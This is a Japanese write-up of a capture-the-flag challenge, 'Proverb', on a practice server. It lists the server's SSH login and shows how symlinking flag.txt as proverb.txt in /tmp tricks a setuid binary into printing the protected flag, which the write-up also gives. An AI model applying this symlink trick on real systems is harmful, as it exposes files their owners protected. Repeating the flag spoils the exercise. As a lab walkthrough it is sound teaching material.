Q13.Proverb 70pt
----------------

問題
----
> SSH: ctfq.sweetduet.info:10022
> ID: q13
> Pass: 8zvWx00MakSCQuGq

解き方
-----

まずはsshで接続してproverbを実行してみます。

```bash
$ ssh q13@ctfq.sweetduet.info -p 10022
Last login: Fri Dec 27 23:02:31 2019 from 10.0.2.2

[q13@localhost ~]$ ls -la
total 48
drwxr-xr-x   2 root root  4096 Jun  1  2012 .
drwxr-xr-x. 17 root root  4096 Oct  6  2014 ..
-rw-r--r--   1 root root    18 May 11  2012 .bash_logout
-rw-r--r--   1 root root   176 May 11  2012 .bash_profile
-rw-r--r--   1 root root   124 May 11  2012 .bashrc
-r--------   8 q13a q13a    22 Jun  1  2012 flag.txt
---s--x--x   4 q13a q13a 14439 Jun  1  2012 proverb
-r--r--r--   2 root root   755 Jun  1  2012 proverb.txt
-r--r--r--   1 root root   151 Jun  1  2012 readme.txt

[q13@localhost ~]$ cat proverb.txt 
All's well that ends well.
A good beginning makes a good ending.
Many a true word is spoken in jest.
Fear is often greater than the danger.
Go for broke!
Fire is a good servant but a bad master.
The wolf knows what the ill beast thinks.
There is always a next time.
Spare the rod and spoil the child.
The calm before the storm.
The die is cast.
Take heed of the snake in the grass.
Confidence is a plant of slow growth.
Love is blind.
The sky's the limit...
Truth lies at the bottom of a well.
Blood is thicker than water.
Ignorance is bliss.
There's no way out.
Full of courtesy, full of craft.
Heaven helps those who help themselves.
Bad luck often brings good luck.
Misfortunes never come singly.
Nothing ventured, nothing gained.
Eternal Immortality.

[q13@localhost ~]$ ./proverb 
Fear is often greater than the danger.
[q13@localhost ~]$ ./proverb 
The wolf knows what the ill beast thinks.
[q13@localhost ~]$ ./proverb 
Blood is thicker than water.
```

proverb.txtから読み取って出力するプログラムのようです。

今回は読み取り権限がないのでobjdumpは使えません。

自由度が低いので/tmpディレクトリに移動して色々試します。

```bash
[q13@localhost ~]$ cd /tmp/
[q13@localhost /tmp]$ mkdir tmp && cd tmp # /tmp/tmpを作成して移動しました(使用済みなら別名で)。

[q13@localhost tmp]$ cp ~/proverb . # 読み取り権限がないので当然cpはできません
cp: cannot open '/home/q13/proverb' for reading: Permission denied

[q13@localhost tmp]$ ln -snf ~/proverb proverb # しかしsymlinkは貼れます

[q13@localhost tmp]$ ls -la
total 8
drwxrwxr-x   2 q13  q13  4096 Dec 28 10:20 .
drwxrwx-wt. 12 root root 4096 Dec 28 10:06 ..
lrwxrwxrwx   1 q13  q13    17 Dec 28 10:20 proverb -> /home/q13/proverb

[q13@localhost tmp]$ ./proverb
Floating point exception
```

実行するとポインタに関する例外が発生しました。読み取るべきファイルが見つからなかったのでしょうか

分かったことをまとめると次のようになります。
 - symlinkは貼れる
 - proverbはおそらく実行時の同一ディレクトリのproverb.txtを参照している

proverb.txtという名前でflag.txtのsymlinkを貼れば良いです。

```bash
[q13@localhost tmp]$ ln -snf ~/flag.txt proverb.txt
[q13@localhost tmp]$ ./proverb 
FLAG_XoK9PzskYedj/T&B
```

シンボリックリンク攻撃だったようです。

FLAG
-----
`FLAG_XoK9PzskYedj/T&B`

